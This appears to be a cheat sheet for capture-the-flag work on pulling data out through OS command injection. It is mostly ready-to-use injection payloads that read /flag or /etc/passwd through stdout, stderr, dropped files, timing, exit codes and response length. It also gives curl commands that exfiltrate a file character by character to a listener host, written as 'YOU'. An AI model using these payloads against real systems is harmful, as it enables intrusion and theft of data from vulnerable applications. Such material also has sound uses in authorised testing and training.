# Data Exfiltration Channels — getting the answer out

## Channel ladder — pick the cheapest that works

```
in-band (stdout in response)
  → stderr in error response
    → file-drop + fetch
      → OOB HTTP/DNS
        → boolean/timing oracle
          → nothing (falsifier territory)
```

## In-band — stdout in the response

The ping tool echoes `PING...`; inject `;id` → `uid=...` in the same
response. Extraction is `cat`/`base64`/`head -c`/`cut -c`/`grep`:

```
;cat /flag
;cat /flag|base64
;xxd -p /flag
;head -c 200 /flag
;grep -o 'flag{.*}' /flag
;awk 'NR==1' /etc/passwd
```

When output goes through a sanitizer that strips `<>`, base64 it first:
`;cat /flag|base64 -w0` — alphanumeric `+/=` only, survives most HTML
sanitizers.

## Stderr channel — the error-message oracle

Some apps capture only stderr into error responses:

```
;cat /flag >&2
;id 1>&2
;ls /nope 2>&1 | head      — stderr→stdout merge
;cat /flag 1>&2            — force stdout into stderr
```

If the app's error path shows `sh: X: not found` errors — check if
stderr is displayed, then redirect your data into it.

## File-drop channel — write where you can fetch

```
;id > /var/www/html/x.txt
;cat /flag > uploads/x.txt       — into the same upload dir
;cp /flag /var/www/html/x.txt
;tee /var/www/html/x.txt
```

The upload dir itself is the natural target — you already know it's
writable and fetchable. `;cat /flag > $PWD/../public/x.txt` relatives.

## Boolean oracle — one bit per request

```
$(if [ "$(head -c1 /flag)" = f ];then sleep 3;fi)      — timing bit
$(grep -q ^f /flag && sleep 3)                         — same via &&/
$(if [ $(( $(head -c2 /flag|od -An -tuC|tr -d ' ') )) -gt 100 ];then sleep 3;fi)  — numeric compare
```

Character-by-character:

```sh
# nth char, compare against candidate
$(if [ "$(cut -c${N} /flag)" = "${C}" ];then sleep 3;fi)
```

Binary search variant — `>`/`<` comparisons against `od` byte values.

## Length oracle — response length leaks the bit

Some apps include the injected output's length in a Content-Length or
in error body size even when output isn't shown — `head -c1` vs `head -
c1000` changes response size measurably.

## Error-message oracle — encode the answer in an error

```
;cat /flag && : || echo NOTF     — error text differs per condition
;bash -c 'exit $(head -c1 /flag|od -An -tuC|tr -d " ")'  — exit code = byte value!
```

Exit-code exfil: `$?` = byte value mod 256 — if the app surfaces the
command's exit code (`command failed with 102`), that's a byte channel.

## The port-knock oracle — no output, but observable

```
;curl http://YOU:8000/$(head -c1 /flag)
```

Each request carries one char in the URL — the listener log is the
extraction record. For full file:

```
;for i in $(seq 1 $(wc -c </flag));do curl "http://YOU/$(cut -c$i /flag)";done
```

## The "in-band through legit output" trick

Inject into the command's own output format — `ping` prints the hostname:

```
;ping -c1 $(cat /flag).x
```

The PING line shows `PING flag{xyz}.x` — the data rides inside the
legit output without needing a new field.

## Chunking — when output is truncated

```
;cut -c1-50 /flag     then    ;cut -c51-100 /flag
;tail -c+51 /flag|head -c50
;dd if=/flag bs=1 skip=50 count=50 2>/dev/null
;xxd -p -s 50 -l 50 /flag
```

## Falsifiers

- no response field, no error text, no writable+fetchable dir, no
  egress, no measurable timing → only exit-code or second-order channels
  remain, else class is dead at this probe point

## Output to record

- channel name + verbatim excerpt (in-band) or listener log (OOB) +
  extraction method chosen
